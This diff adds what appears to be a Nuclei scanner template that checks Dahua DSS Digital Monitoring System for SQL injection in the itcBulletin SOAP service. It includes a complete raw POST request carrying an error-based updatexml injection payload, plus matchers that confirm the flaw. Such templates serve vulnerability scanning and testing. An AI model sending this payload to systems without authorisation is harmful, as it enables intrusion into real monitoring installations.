@@ -1,0 +1,38 @@
+id: poc-yaml-dahua-dss-digital-monitoring-system-itcbulletin-sqli
+info:
+  name: Dahua DSS Digital Monitoring System itcBulletin SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1,1000)}}"
+
+http:
+  - raw:
+      - |
+        POST /portal/services/itcBulletin?wsdl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
+        <s11:Body>
+        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
+        <netMarkings>
+         (updatexml(1,concat(0x7e,(select md5("{{t1}}")),0x7e),1))) and (1=1
+        </netMarkings>
+        </ns1:deleteBulletin>
+        </s11:Body>
+        </s11:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: dsl
+        dsl:
+          - contains(body, substr(md5(t1), 1, 30))
